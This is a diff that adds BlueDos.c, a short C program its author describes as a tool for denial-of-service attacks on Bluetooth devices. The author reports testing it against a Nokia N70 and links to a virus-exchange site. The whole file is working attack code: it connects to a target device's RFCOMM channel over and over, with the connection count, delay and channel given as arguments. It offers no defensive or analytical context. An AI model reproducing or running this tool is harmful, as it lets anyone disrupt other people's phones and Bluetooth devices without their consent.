@@ -1,0 +1,87 @@
+/* A simple tool to make DoS against bluetooth devices. 
+   Compile it so: gcc BlueDos.c -o BlueDos -lbluetooth
+   I have test this proggy against my nokia n70 and it seems to work.
+   Have fun!
+   Contact me at wargame89@yahoo.it or visit: http://vx.netlux.org/wargamevx
+*/
+
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/rfcomm.h>
+#include <sys/socket.h>
+
+/* make the real connection */
+int BlueConnect(bdaddr_t *dst,short channel)
+{
+	struct sockaddr_rc remote_addr, local_addr;
+	int sock;
+
+	if ((sock = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)) < 0) 
+	{
+		printf("Error creating the bluetooth socket!\n");
+		return 0;	
+	}
+
+	memset(&local_addr, 0, sizeof(local_addr));
+	local_addr.rc_family = AF_BLUETOOTH;
+	bacpy(&local_addr.rc_bdaddr, BDADDR_ANY); 
+	
+	if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0) 
+	{
+		printf("Error binding!\n"); 
+		close(sock);
+		return 0;
+	}
+
+	memset(&remote_addr, 0, sizeof(remote_addr));
+	remote_addr.rc_family = AF_BLUETOOTH;
+	bacpy(&remote_addr.rc_bdaddr, dst);
+	remote_addr.rc_channel = channel;
+
+	if (connect(sock, (struct sockaddr *)&remote_addr, sizeof(remote_addr)) < 0) 
+	{
+		printf("Error connecting!\n");
+	        /* Do not return */
+	}
+
+	else
+	{
+		printf("[* Done]\n");
+	}
+	
+	close(sock); /* close the socket */
+	
+}
+
+int main(int argc,char *argv[])
+{
+	int dos_cnt,it;
+	bdaddr_t dst;
+	short channel = 1;
+
+	if(argc < 4)
+	{
+		printf("Usage: %s <bt_addr> <conn_num> <sec_sleep> <channel (optional, default = 1)>\n",argv[0]);
+		return 0;
+	}
+
+	str2ba(argv[1],&dst);
+	dos_cnt = abs(atoi(argv[2]));
+	it = abs(atoi(argv[3]));
+
+	if(argv[4] != NULL)
+	{
+		channel = abs(atoi(argv[4]));
+	}
+
+	printf("[bt_addr = %s,conn_num = %d,sec_sleep = %d,channel = %d]\n",argv[1],dos_cnt,it,channel);
+
+	for(;dos_cnt > 0;dos_cnt--)
+	{
+		BlueConnect(&dst,channel);
+		sleep(it);	
+	}
+
+	return 1;
+}
+
+		
